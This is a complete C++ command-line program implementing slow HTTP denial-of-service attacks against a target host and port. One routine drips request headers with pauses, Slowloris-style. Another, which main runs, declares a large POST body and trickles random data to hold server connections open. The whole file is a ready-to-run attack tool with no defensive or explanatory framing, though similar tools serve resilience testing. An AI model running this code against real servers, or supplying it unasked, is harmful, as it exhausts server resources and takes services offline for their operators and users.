#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <iostream>
#include <vector>
#define ERRNOSTR   strerror(errno)
#define error(...) { fprintf(stderr, __VA_ARGS__); exit(1); }
using namespace std;


string host_header;  // HTTP header Host

// Return socket Fd; host can be either hostname or IP address.
int connect_TCP(const char* host, unsigned short port) {
    struct sockaddr_in addr;
    struct addrinfo* info;
    int sockFd;

    if (getaddrinfo(host, NULL, NULL, &info) == 0) {
        memcpy(&addr, info->ai_addr, sizeof(addr));
        freeaddrinfo(info);
    } else if ((addr.sin_addr.s_addr = inet_addr(host)) == INADDR_NONE) {
        error("Cannot resolve host addr: %s\n", host);
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if ((sockFd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        error("Cannot create socket: %s\n", ERRNOSTR);
    }
    if ((connect(sockFd, (struct sockaddr*)&addr, sizeof(addr))) < 0) {
        error("Cannot connect to %s (%d): %s\n", inet_ntoa(addr.sin_addr), \
              ntohs(addr.sin_port), ERRNOSTR);
    }
    printf("Connected to %s (%d)\n", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
    return sockFd;
}

void get_attack(int sock, int delay=3) {
    vector<string> msg = {
        "GET / HTTP/1.1\r\n",
        host_header,
        "User-Agent: a\r\n",
        "Accept: */*\r\n",
        "X-a: 1234\r\n",
        "X-a: 3234\r\n",
        "X-a: 34534545\r\n",
        "X-a: 429548724598457\r\n",
        "\r\n"
    };

    for (string m : msg) {
        write(sock, m.c_str(), m.size());
        printf("%s\n", m.c_str());
        sleep(delay);
    }
}

// Send fast at first, then slow down to take 50 sec for finishing the last part.
// form: use form or file-upload as the content-type.
// data_rate: bytes/s
void post_attack(int sock, int iteration=100, bool form=false, int data_rate=600) {
    vector<string> header = {
        "POST / HTTP/1.1\r\n",
        host_header,
        "User-Agent: a\r\n",
        "Accept: */*\r\n",
        "Content-Length: " + to_string((form ? 0 : 193) + data_rate * iteration) + "\r\n",
    };
    if (form) {
        vector<string> tmp = {
            "Content-Type: application/x-www-form-urlencoded\r\n",
            "\r\n",
        };
        for (auto t : tmp) header.push_back(t);
    } else {
        vector<string> tmp = {
            "Expect: 100-continue\r\n",
            "Content-Type: multipart/form-data; boundary=------------------------03b7aa8056b76ef3\r\n",
            "\r\n",
            "--------------------------03b7aa8056b76ef3\r\n",
            "Content-Disposition: form-data; name=\"file\"; filename=\"a\"\r\n",
            "Content-Type: application/octet-stream\r\n",
            "\r\n",
        };
        for (auto t : tmp) header.push_back(t);
    };
    string body;
    string tail = form ? "" : "\r\n--------------------------03b7aa8056b76ef3--\r\n";

    // generate body
    srand(time(NULL));
    for (int i = 0; i < data_rate; i++) {
        body.push_back((char)(rand() % (0x7e - 0x20) + 0x20));
    }

    for (string h : header) {
        write(sock, h.c_str(), h.size());
    }
    for (int i = 0; i < iteration; i++) {
        write(sock, body.c_str(), body.size());
        printf("[%d / %d] %s...\n", i, iteration, body.substr(0, 80).c_str());
        if (i + 50 >= iteration) {
            sleep(1);
        }
    }
    write(sock, tail.c_str(), tail.size());
}

void read_response(int sock) {
    char buf[1025];

    sleep(1);
    read(sock, buf, 1024);
    printf("%s\n", buf);
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("SYNOPSIS\n\t%s <host> <port> [size]\n", argv[0]);
        printf("\thost\tThe address of the target.\n");
        printf("\tport\tThe port of the target.\n");
        printf("\tsize\tThe size of http body in KB. (default=1024)\n");
        exit(0);
    }
    host_header = "Host: " + string(argv[1]) + ":" + string(argv[2]) + "\r\n";
    int body_size = (argc >= 4) ? atoi(argv[3]) * 1024 : 1024 * 1024;

    int sock = connect_TCP(argv[1], atoi(argv[2]));

    // get_attack(sock);
    post_attack(sock, body_size / 600, true);

    read_response(sock);
    return 0;
}
